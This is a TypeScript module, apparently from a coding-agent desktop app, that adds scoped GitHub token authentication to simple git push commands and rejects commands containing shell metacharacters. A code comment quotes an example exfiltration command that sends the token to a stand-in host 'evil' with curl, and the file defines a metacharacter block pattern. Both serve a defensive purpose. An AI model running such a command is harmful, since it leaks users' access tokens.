// src/electron/githubPushAuth.ts
import { spawn } from "node:child_process";

export function isUnauthenticatedGithubRemote(url: string): boolean {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return false; // SSH shorthand (git@github.com:owner/repo.git) and local paths aren't parseable URLs — neither needs this rewrite.
  }
  if (parsed.protocol !== "https:") return false;
  if (parsed.hostname !== "github.com") return false;
  if (parsed.username || parsed.password) return false; // already has embedded credentials
  return true;
}

/** Mirrors git's own default: the named remote right after "push" (skipping
 * leading flags like -u/--set-upstream), or "origin" if none is named. Good
 * enough for the common invocation shapes this feature targets — it never
 * needs to be a full git-argument parser, since a shape it doesn't
 * recognize just falls through to parseGitPushRemoteName's "origin"
 * default, which prepareGitPushCommand then verifies against the real
 * configured remote before doing anything. */
export function parseGitPushRemoteName(command: string): string {
  const afterPush = command.trim().replace(/^git\s+push\s*/, "");
  const tokens = afterPush.split(/\s+/).filter(Boolean);
  for (const token of tokens) {
    if (token.startsWith("-")) continue;
    return token;
  }
  return "origin";
}

const DANGEROUS_SHELL_CHARS = /[;&|`$<>(){}\n]/;

/** True only for a "simple" git push invocation — whitespace-separated
 * tokens with no shell metacharacters. Authentication is only ever
 * injected for commands that pass this check: an env-var token is visible
 * to every process a compound/shell command can spawn (e.g.
 * "git push origin main; curl evil -d $TOKEN" would see the token in its
 * own environment even though it never appears in the command's own
 * text) — so a command shaped like anything but a bare git push is never
 * a candidate for authentication at all. */
export function isSimpleGitPushCommand(command: string): boolean {
  return /^git\s+push\b/.test(command.trim()) && !DANGEROUS_SHELL_CHARS.test(command);
}

const CREDENTIAL_HELPER_SCRIPT = `!f() { echo username=x-access-token; echo \"password=$LOCALAGENT_GH_TOKEN\"; }; f`;

/**
 * Builds the argv (never a shell string) that runs the original push with
 * an injected, github.com-scoped, one-shot credential helper.
 *
 * Two -c overrides, always in this order:
 * - "credential.helper=" (empty) RESETS git's helper list first. Without
 *   this, `-c credential.helper=X` only ADDS to whatever helpers are
 *   already configured (osxkeychain, `store`, `gh auth setup-git`, etc.) —
 *   which would be consulted FIRST (an unrelated cached account could
 *   silently win a push) and would have their own `approve` invoked on a
 *   successful push, permanently writing this app's token into the user's
 *   OS keychain or a plaintext store file, completely outside this app's
 *   own StorageCrypto-encrypted storage and surviving Disconnect.
 * - "credential.https://github.com.helper=<script>" is SCOPED to
 *   github.com specifically. A bare "credential.helper=<script>" (with no
 *   scope) would be offered to ANY host git needs credentials for during
 *   this one push — a submodule on another host, git-lfs, or a remote
 *   whose effective push URL differs from the one this function checked
 *   (remote.<name>.pushurl, a url.<host>.pushInsteadOf rewrite, or a URL
 *   crafted so this module's own URL parsing and git's own host-matching
 *   disagree). Scoping to the literal host git resolves for each
 *   individual credential request closes all of those at once — the
 *   helper is never even invoked for a request against a different host,
 *   regardless of how that request's URL was arrived at.
 *
 * Passed to a plain (non-shell) spawn — see runCommand.ts — so there is no
 * outer shell to interpret this feature's own quoting at all. That
 * matters cross-platform: Node's shell:true uses cmd.exe on Windows, which
 * does not understand POSIX single-quoting, so a shell-string version of
 * this same rewrite would silently fail every authenticated push there.
 */
export function buildAuthenticatedGitPushArgv(command: string, token: string): { argv: string[]; env: Record<string, string> } {
  const originalArgs = command.trim().split(/\s+/).slice(1); // drop the leading "git", keep "push ..."
  const argv = ["git", "-c", "credential.helper=", "-c", `credential.https://github.com.helper=${CREDENTIAL_HELPER_SCRIPT}`, ...originalArgs];
  return { argv, env: { LOCALAGENT_GH_TOKEN: token } };
}

async function getConfiguredRemoteUrl(workspaceRoot: string, remoteName: string, env: NodeJS.ProcessEnv): Promise<string | null> {
  return new Promise((resolve) => {
    const proc = spawn("git", ["remote", "get-url", remoteName], { cwd: workspaceRoot, env });
    let stdout = "";
    proc.stdout.on("data", (d) => (stdout += d.toString()));
    proc.on("close", (code) => resolve(code === 0 ? stdout.trim() : null));
    proc.on("error", () => resolve(null));
  });
}

/** True if git already has some way to authenticate to github.com without
 * this app's help — an existing credential helper (osxkeychain, `store`,
 * `gh auth setup-git`, one configured directly for this remote), checked
 * via git's own real credential resolution rather than re-implemented
 * here. GIT_TERMINAL_PROMPT=0 guarantees this never blocks waiting on an
 * interactive prompt — an unconfigured setup just answers with no
 * password line, same as it would non-interactively for any script. This
 * is what keeps an already-working setup (including the CLI entry point,
 * which never has a connected account to fall back to) behaving exactly
 * as it did before this feature existed, per the spec. */
async function hasExistingGithubCredential(workspaceRoot: string, env: NodeJS.ProcessEnv): Promise<boolean> {
  return new Promise((resolve) => {
    const proc = spawn("git", ["credential", "fill"], { cwd: workspaceRoot, env: { ...env, GIT_TERMINAL_PROMPT: "0" } });
    let stdout = "";
    proc.stdout.on("data", (d) => (stdout += d.toString()));
    proc.on("close", () => resolve(/^password=/m.test(stdout)));
    proc.on("error", () => resolve(false));
    proc.stdin.write("protocol=https\nhost=github.com\n\n");
    proc.stdin.end();
  });
}

export type PreparedCommand =
  | { kind: "unchanged"; command: string }
  | { kind: "authenticated"; argv: string[]; env: Record<string, string> }
  | { kind: "blocked"; reason: string };

/**
 * Decides whether a run_command invocation needs GitHub push authentication
 * injected, and produces the rewritten argv if so. Never touches anything
 * but a genuinely simple `git push` (Important: no shell metacharacters —
 * see isSimpleGitPushCommand) targeting an unauthenticated github.com HTTPS
 * remote with no credential already configured for it (Review Focus:
 * non-github remotes pass through untouched; an already-working setup is
 * never overridden). When it IS the target but no account is connected and
 * nothing else can authenticate it either, blocks with a clear, actionable
 * error rather than letting git fail confusingly on its own — the caller
 * must not spawn git at all in that case.
 */
export async function prepareGitPushCommand(
  command: string,
  workspaceRoot: string,
  getToken: () => Promise<string | null>,
  env: NodeJS.ProcessEnv = process.env
): Promise<PreparedCommand> {
  if (!isSimpleGitPushCommand(command)) return { kind: "unchanged", command };

  const remoteName = parseGitPushRemoteName(command);
  const remoteUrl = await getConfiguredRemoteUrl(workspaceRoot, remoteName, env);
  if (!remoteUrl || !isUnauthenticatedGithubRemote(remoteUrl)) return { kind: "unchanged", command };

  if (await hasExistingGithubCredential(workspaceRoot, env)) return { kind: "unchanged", command };

  const token = await getToken();
  if (!token) {
    return { kind: "blocked", reason: "This push targets GitHub, but no GitHub account is connected — connect one in Settings first." };
  }
  const { argv, env: tokenEnv } = buildAuthenticatedGitPushArgv(command, token);
  return { kind: "authenticated", argv, env: tokenEnv };
}
